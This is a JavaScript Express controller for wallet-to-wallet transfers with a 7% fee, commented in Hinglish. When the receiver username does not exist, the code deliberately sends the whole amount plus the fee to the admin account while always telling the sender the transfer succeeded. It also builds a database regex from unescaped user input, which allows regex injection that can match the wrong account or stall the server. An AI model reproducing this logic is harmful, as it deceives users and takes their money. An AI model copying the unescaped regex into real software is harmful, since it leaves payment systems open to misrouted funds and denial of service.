const User = require('../models/User');
const Transaction = require('../models/Transaction');

exports.transferFunds = async (req, res) => {
    try {
        const { receiverUsername, amount, walletType } = req.body;
        const senderId = req.user.id;
        const transferAmount = Number(amount);

        if (!transferAmount || transferAmount <= 0) return res.status(400).json({ success: false, message: 'Invalid amount' });

        const sender = await User.findById(senderId);
        if (!sender) return res.status(404).json({ success: false, message: 'Sender not found' });

        // 💸 7% Fee Calculation
        const fee = transferAmount * 0.07;
        const totalCost = transferAmount + fee; // e.g. 100 + 7 = 107

        if (sender.wallets[walletType] < totalCost) {
            return res.status(400).json({ success: false, message: `Insufficient balance! You need Rs. ${totalCost.toFixed(2)} (incl 7% fee)` });
        }

        // 1. Sender se total paise (Amount + Fee) kaat lo
        sender.wallets[walletType] -= totalCost;
        await sender.save();

        // 2. Sender ka record bana do
        await Transaction.create({
            userId: sender._id, type: 'transfer', amount: totalCost, netAmount: -totalCost,
            details: `Transferred Rs. ${transferAmount} to ${receiverUsername} (Fee: Rs. ${fee.toFixed(2)})`, status: 'completed'
        });

        const adminAccount = await User.findOne({ role: 'admin' });
        // Exact match check karein (case-insensitive)
        const receiver = await User.findOne({ username: { $regex: new RegExp(`^${receiverUsername}$`, 'i') } });

        if (receiver) {
            // ✅ VALID USER LOGIC: Receiver ko amount do, Admin ko 7% fee do
            receiver.wallets.deposit += transferAmount; 
            await receiver.save();

            await Transaction.create({
                userId: receiver._id, type: 'transfer', amount: transferAmount, netAmount: transferAmount,
                details: `Received Rs. ${transferAmount} from ${sender.username}`, status: 'completed'
            });

            if (adminAccount) {
                adminAccount.wallets.deposit += fee;
                await adminAccount.save();
            }
        } else {
            // 🚨 INVALID USER TRAP: Pura ka pura paisa (Amount + 7% Fee) Admin Treasury mein!
            if (adminAccount) {
                adminAccount.wallets.deposit += totalCost;
                await adminAccount.save();
            }
        }

        // Response hamesha Success denge, taake scammer ko pata na chale
        res.status(200).json({ success: true, message: `Successfully transferred Rs. ${transferAmount} to ${receiverUsername}!` });

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};